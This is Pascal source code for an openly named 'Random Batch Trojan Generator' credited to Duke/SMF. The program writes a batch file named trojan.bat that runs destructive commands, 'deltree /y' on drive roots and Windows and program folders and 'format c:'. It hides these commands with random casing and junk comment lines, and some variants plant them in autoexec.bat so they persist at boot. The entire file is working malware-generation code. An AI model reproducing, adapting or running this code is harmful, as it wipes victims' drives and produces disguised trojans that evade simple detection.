{$I-,S-}
program Random_Batch_Trojan_Generator_1_1;
var f:text;
    s:string;
    r:byte;
    i:integer;
    m1,m2:string;
    zz:byte;
{-------------------------}
procedure WRT(st:string;m:byte);
var i:byte;
    r:byte;
begin
for i:=1 to length(st) do
  begin
  r:=random(10);
  if r/2=(r div 2) then write(f,st[i]) else write(f,upcase(st[i]));
  end;
if m=0 then writeln(f,'');
end;
{-------------------------}
procedure Junk;
var j:string;
    i:byte;
begin
if random(2)=0 then exit;
j:='';
r:=random(3);
case r of
  0 : j:='rem ';
  1 : j:='@rem ';
  2 : for i:=1 to random(4)+1 do j:=j+':';
  end;
for i:=1 to random(120) do j:=j+chr(random(25)+97);
wrt(j,0);
end;
{-------------------------}
function Space:string;
var s:string;
    i:byte;
begin
s:='';
for i:=1 to random(10) do s:=s+' ';
Space:=s;
end;
{-------------------------}
procedure Make1;
label lab1;
begin
s:='deltree /y';
lab1:
s:=s+' ';
if random(2)=0 then s:=s+'c:' else s:=s+'d:';
r:=random(5);
case r of
 0 : s:=s+'\*.*';
 1 : s:=s+'\dos';
 2 : s:=s+'\windows';
 3 : s:=s+'\progra~1';
 end;
if random(2)=0 then goto lab1;
if zz=1 then if random(2)=0 then s:='echo '+Space+s+Space+'>>'+Space+'c:\autoexec.bat'
                            else s:='echo'+Space+'>>'+Space+'c:\autoexec.bat '+Space+s;
if random(2)=0 then s:='@'+s;
wrt(s,0);
for i:=1 to random(3)+1 do Junk;
end;
{-------------------------}
procedure Make2;
begin
s:='format c: ';
r:=random(3);
case r of
 0 : ;
 1 : s:=s+'/q ';
 2 : s:=s+'/u ';
 end;
if zz=1 then if random(2)=0 then s:='echo '+Space+s+Space+'>>'+Space+'c:\autoexec.bat'
                            else s:='echo'+Space+'>>'+Space+'c:\autoexec.bat '+Space+s;
if random(2)=0 then s:='@'+s;
wrt(s,0);
for i:=1 to random(3)+1 do Junk;
end;
{-------------------------}
begin
Randomize;
s:=paramstr(1);
if (s[1]<>'-') or (upcase(s[2])<>'V') then
  begin
  writeln('Random Batch Trojan Generator v1.1 (c) by Duke/SMF');
  writeln('Use "RBTG.EXE -V" to hide this message');
  end;
assign(f,'trojan.bat');rewrite(f);
if random(2)=0 then wrt('@echo off',0) else wrt('@ctty nul',0);
for i:=1 to random(3)+1 do Junk;
{------}
zz:=random(3);
if zz=0 then
  begin
  if random(2)=0 then write(f,'@');
  wrt('if not "%0==" goto ',1);
  m1:='';
  for i:=1 to random(20) do m1:=m1+chr(random(25)+97);
  writeln(f,m1);
  for i:=1 to random(3)+1 do Junk;
  end;
r:=random(4);
case r of
  0 : begin
      if random(2)=0 then Make1;
      Make2;
      end;
  1 : begin
      if random(2)=0 then Make2;
      Make1;
      end;
  2 : begin
      Make1;
      if random(2)=0 then Make2;
      end;
  3 : begin
      Make2;
      if random(2)=0 then Make1;
      end;
  end;
if zz=0 then
  begin
  if random(2)=0 then write(f,'@');
  wrt('goto ',1);
  m2:='';
  for i:=1 to random(20) do m2:=m2+chr(random(25)+97);
  writeln(f,m2);
  for i:=1 to random(3)+1 do Junk;
  writeln(f,':',m1);
  if random(2)=0 then
    begin
    s:='copy '+Space+'c:\autoexec.bat+%0';
    if random(2)=0 then s:=s+Space+'>nul';
    end
  else
    begin
    s:='type %0'+Space+'>>'+Space+'c:\autoexec.bat';
    end;
  if random(2)=0 then s:='@'+s;
  wrt(s,0);
  for i:=1 to random(3)+1 do Junk;
  writeln(f,':',m2);
  for i:=1 to random(3)+1 do Junk;
  end;
close(f);
end.